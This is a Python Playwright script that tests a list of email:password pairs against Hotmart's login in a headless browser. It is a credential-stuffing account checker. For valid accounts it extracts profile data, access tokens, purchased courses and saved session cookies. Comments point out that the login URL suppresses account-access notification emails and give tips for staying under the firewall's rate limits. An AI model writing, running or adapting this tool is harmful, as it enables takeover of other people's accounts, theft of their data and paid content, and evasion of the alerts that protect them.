import asyncio
import json
import os
import time
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# --- CONSTANTES GLOBAIS ---
LOGIN_URL_PADRAO = "https://sso.hotmart.com/login?passwordless=false&service=https%3A%2F%2Fsso.hotmart.com%2Foauth2.0%2FcallbackAuthorize%3Fclient_id%3D0fff6c2a-971c-4f7a-b0b3-3032b7a26319%26redirect_uri%3Dhttps%253A%252F%252Fconsumer.hotmart.com%252Fauth%252Flogin%26response_type%3Dcode%26response_mode%3Dquery%26client_name%3DCasOAuthClient" # O "passwordless=false" na URL evita da Hotmart enviar email de confirmação de login ou emails de que a conta foi acessada.
CLIENTES_ENTRADA_FILE = 'clientes.txt'

# Arquivos de Saída Consolidados
ESTADO_GLOBAL_FILE = 'sucessos_e_checkpoint.json' # Arquivo central para SUCESSOS e PENDENTES
FALHAS_CRITICAS_FILE = 'falhas_criticas.json'      # Arquivo separado para ERROS NÃO ESPERADOS
FALHAS_AUTH_TXT_FILE = 'falhas_autenticacao_rede.txt' # Arquivo TXT para falhas de rede/auth

# Pasta para os arquivos de estado por cliente
STATE_FOLDER = 'cliente_states'
os.makedirs(STATE_FOLDER, exist_ok=True) 

# --- FUNÇÕES DE SUPORTE ---
def carregar_clientes_do_arquivo():
    """Carrega as contas do arquivo clientes.txt (Precisa estar nesse formato "email:senha")."""
    clientes_raw = []
    try:
        with open(CLIENTES_ENTRADA_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    email, senha = line.split(':', 1)
                    clientes_raw.append({
                        "email": email, "senha": senha
                    })
        return clientes_raw
    except FileNotFoundError:
        print(f"ERRO: Arquivo '{CLIENTES_ENTRADA_FILE}' não encontrado.")
        return []
    except Exception as e:
        print(f"ERRO ao ler o arquivo de clientes: {e}")
        return []

def carregar_estado_global(filename=ESTADO_GLOBAL_FILE):
    """Tenta carregar o estado global do arquivo JSON."""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            data_list = json.load(f)
            return {item['email']: item for item in data_list}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}
    except Exception as e:
        print(f"ERRO ao carregar o estado global '{filename}': {e}. Iniciando do zero.")
        return {}

def salvar_estado_global(clientes_data_dict, filename=ESTADO_GLOBAL_FILE):
    """Salva o dicionário de estado global no arquivo JSON centralizado."""
    data_list = list(clientes_data_dict.values())
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data_list, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"ERRO ao salvar o estado global '{filename}': {e}")
        
def consolidar_falhas_criticas(falhas_pendentes):
    """Salva a lista de falhas críticas em um arquivo JSON, concatenando se o arquivo existir."""
    if not falhas_pendentes:
        return
        
    dados_existentes = carregar_estado_global(FALHAS_CRITICAS_FILE)
    
    for falha in falhas_pendentes:
        dados_existentes[falha['email']] = falha
        
    try:
        with open(FALHAS_CRITICAS_FILE, 'w', encoding='utf-8') as f:
            json.dump(list(dados_existentes.values()), f, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"ERRO ao consolidar o arquivo {FALHAS_CRITICAS_FILE}: {e}")

def salvar_falha_auth_txt(email: str, senha: str):
    """Salva email:senha no arquivo de falhas de autenticação de rede/HTTP (401/403)."""
    try:
        with open(FALHAS_AUTH_TXT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{senha}\n")
    except Exception as e:
        print(f"ERRO ao salvar falha de autenticação em TXT: {e}")
        

async def aceitar_cookies(page):
    """Tenta clicar no botão 'OK' do pop-up de cookies."""
    try:
        await page.wait_for_selector('button.cookie-policy-accept-all:has-text("OK")', timeout=5000) # É incomum encontrar multiplos erros nessa etapa, experimente aumentar esse Valor caso necessário
        await page.click('button.cookie-policy-accept-all:has-text("OK")')
    except PlaywrightTimeoutError:
        pass

async def extrair_dados_cursos_e_perfil(context, email_cliente, page):
    """Extrai os dados do perfil (via JS) e os cursos (via API)."""
    
    dados_perfil = {}
    dados_cursos = {"cursos": []}
    token = None
    
    # --- 1. CAPTURA DOS DADOS DO PERFIL (JWT do LocalStorage) ---
    try:
        token_full_json = await page.evaluate("localStorage.getItem('cas-js:user')")
        if token_full_json:
            token_obj = json.loads(token_full_json)
            profile_data = token_obj.get('profile', {})
            token = token_obj.get('access_token')

            dados_perfil = {
                "hotmart_id": profile_data.get('id'),
                "nome_completo": profile_data.get('name', email_cliente), 
                "autoridades": profile_data.get('authorities'),
                "tipo_entidade": profile_data.get('entityType'),
                "pais": profile_data.get('address', {}).get('country'),
                "locale": profile_data.get('locale'),
                "data_cadastro_ms": profile_data.get('signupDate'),
            }
        else:
            raise Exception("Token de autenticação não encontrado no LocalStorage.")
            
    except Exception as e:
        dados_perfil = {"erro_perfil": f"Falha na extração de perfil: {e}"}
        token = None

    # --- 2. EXTRAÇÃO DOS CURSOS VIA API ---
    if token:
        try:
            PAID_URL = '/club-drive-api/rest/v2/purchase/?archived=UNARCHIVED'
            FREE_URL = '/club-drive-api/rest/v1/purchase/free/?archived=UNARCHIVED'
            BASE_API_URL = 'https://api-hub.cb.hotmart.com'
            
            api_context = context.request
            headers = {
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://consumer.hotmart.com/',
                'Origin': 'https://consumer.hotmart.com',
                'Authorization': f'Bearer {token}'
            }

            paid_response = await api_context.get(f"{BASE_API_URL}{PAID_URL}", headers=headers)
            paid_data = await paid_response.json() if paid_response.ok else {'data': []}
            
            free_response = await api_context.get(f"{BASE_API_URL}{FREE_URL}", headers=headers)
            free_data = await free_response.json() if free_response.ok else {'data': []}
            
            cursos = []
            if paid_response.ok:
                for item in paid_data.get('data', []):
                    cursos.append({"tipo": "Pago", "id_curso": item.get('product', {}).get('id'), "nome_curso": item.get('product', {}).get('name')})
            
            if free_response.ok:
                for item in free_data.get('data', []):
                    cursos.append({"tipo": "Gratuito", "id_curso": item.get('product', {}).get('id'), "nome_curso": item.get('product', {}).get('name')})

            dados_cursos['cursos'] = cursos
            
        except Exception as e:
            dados_cursos['erro_extracao'] = f"Falha na API: {e}"
            
    return dados_perfil, dados_cursos

# --- FUNÇÃO DE COLETA (MÉTODO CORE) ---
async def hotmart_login_escalonavel(email: str, senha: str):
    
    client_name_safe = email.replace('@', '_at_').replace('.', '_dot_')
    resultado_falha = {"sucesso": False, "motivo": "INICIANDO"}

    response_post_login = None
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True) # Troque para "False" caso queira visualizar o navegador durante o processo.
        context = await browser.new_context()
        page = await context.new_page()

        def handle_response(response):
            nonlocal response_post_login
            if response.url.startswith("https://sso.hotmart.com/login") and response.request.method == "POST":
                response_post_login = response
                
        page.on("response", handle_response)
        
        try:
            await page.goto(LOGIN_URL_PADRAO, wait_until="load", timeout=25000)
            await aceitar_cookies(page)
            await page.wait_for_selector('input[name="username"]', timeout=15000)
            await page.fill('input[name="username"]', email)
            await page.fill('input[name="password"]', senha)
            await page.click('button[type="submit"]') 

            await asyncio.sleep(1) 
            
            # 1. FAST FAIL: CHECAGEM DO STATUS HTTP (401/403)
            if response_post_login and response_post_login.status in [401, 403]:
                salvar_falha_auth_txt(email, senha)
                return {"sucesso": False, "motivo": f"Falha de Autenticação/Rede (Status {response_post_login.status})"}
            
            # 2. FAST FAIL: ERRO VISÍVEL (Conta Bloqueada ou Credencial Inválida)
            seletor_falha = 'text=/Incorrect user or password|Usuário ou senha incorretos|Account blocked|We’ve blocked access|Conta bloqueada|Acesso bloqueado|Usuário incorreto|Senha incorreta|Two-step verification|We’ve sent a code|try again/i' # Essa lista não é perfeita, experimente adicionar mais parâmetros para melhorar o filtro. Lembre-se: Quanto mais rápido forem as requisições, maiores as chances do Firewall te bloquear.
            try:
                await page.wait_for_selector(seletor_falha, timeout=5000)
                
                if await page.is_visible('text=/Account blocked|We’ve blocked access|Two-step verification/i'):
                    resultado_falha["motivo"] = "Conta Bloqueada (Tentativas Excedidas/2fa)"
                else:
                    resultado_falha["motivo"] = "Credenciais Inválidas"
                
                return resultado_falha

            except PlaywrightTimeoutError:
                pass 

            # 3. AGUARDAR O SUCESSO DO LOGIN
            await page.wait_for_url("**/consumer.hotmart.com/main**", timeout=25000) # Recomendo um valor entre 20 - 30 segundos.
            seletor_sucesso = 'text=/Gerenciar meu negócio|Gerenciar meu negocio|Manage my business|Minhas compras|Mis compras|My purchases/i' # Tente aumentar essa lista também. Lembrando que a busca de informações é feita pelo localstorage e a de cursos é direto da API.

            await page.wait_for_selector(seletor_sucesso, timeout=15000)
            await asyncio.sleep(3) 
            dados_perfil, dados_cursos = await extrair_dados_cursos_e_perfil(context, email, page)
            await context.storage_state(path=os.path.join(STATE_FOLDER, f"{client_name_safe}_state.json"))
            return {"sucesso": True, "motivo": "Login e Extração OK", "dados_perfil": dados_perfil, "dados_cursos": dados_cursos}

        except Exception as e:
            resultado_falha["motivo"] = f"Exceção Crítica: {e}"
            return resultado_falha

        finally:
            await browser.close()

# --- FUNÇÃO DE GERENCIAMENTO (MAIN) ---
async def main():
    clientes_raw = carregar_clientes_do_arquivo()
    if not clientes_raw: return
    clientes_data = carregar_estado_global(ESTADO_GLOBAL_FILE)
        
    print(f"--- {len([c for c in clientes_data.values() if c.get('status') == 'SUCESSO'])} clientes já processados com sucesso. ---")

    clientes_processar = []
    
    for cliente in clientes_raw:
        status_atual = clientes_data.get(cliente['email'], {}).get('status') # Se não estiver no arquivo de estado ou o status não for SUCESSO, ele entra na fila. Ele só pula contas com "SUCESSO".
        if status_atual != "SUCESSO":
             clientes_processar.append(cliente)
        else:
             print(f"[PULANDO] Cliente {cliente['email']} já tem status SUCESSO.")

    print(f"\n--- INICIANDO PROCESSAMENTO: {len(clientes_processar)} clientes ---")

    falhas_criticas_pendentes = []

    for i, cliente in enumerate(clientes_processar):
        print(f"\n[CLIENTE {i+1}/{len(clientes_processar)}] Processando: {cliente['email']}")
        
        resultado = await hotmart_login_escalonavel(cliente['email'], cliente['senha'])
        status_final = "SUCESSO" if resultado['sucesso'] else resultado['motivo']
        
        if resultado['sucesso']:
            cliente_final = {
                "email": cliente['email'],
                "senha": cliente['senha'],
                "status": "SUCESSO",
                "timestamp_processamento": str(int(time.time())),
                "perfil": resultado.get('dados_perfil', {}),
                "cursos": resultado.get('dados_cursos', {})
            }
            clientes_data[cliente['email']] = cliente_final

        elif "Exceção Crítica" in resultado['motivo']:
            falha_critica = {
                "email": cliente['email'],
                "senha": cliente['senha'],
                "status": "FALHA CRÍTICA",
                "motivo": resultado['motivo'],
                "timestamp": str(int(time.time()))
            }
            falhas_criticas_pendentes.append(falha_critica)

        else:
             # O 401/403 é logado no TXT e os outros erros (Credenciais Inválidas, Bloqueio)
             # não são salvos no checkpoint para permitir re-tentativa (a não ser que sejam erros críticos)
             pass
        
        print(f"   STATUS FINAL: {status_final}")
        salvar_estado_global(clientes_data, ESTADO_GLOBAL_FILE)
        consolidar_falhas_criticas(falhas_criticas_pendentes)
        falhas_criticas_pendentes = []
        
        await asyncio.sleep(7) 


    print("\n\n--- Processo de Login Concluído ---")
    print(f"Dados finais de {len(clientes_data)} clientes salvos em '{ESTADO_GLOBAL_FILE}'")
    
if __name__ == "__main__":
    asyncio.run(main())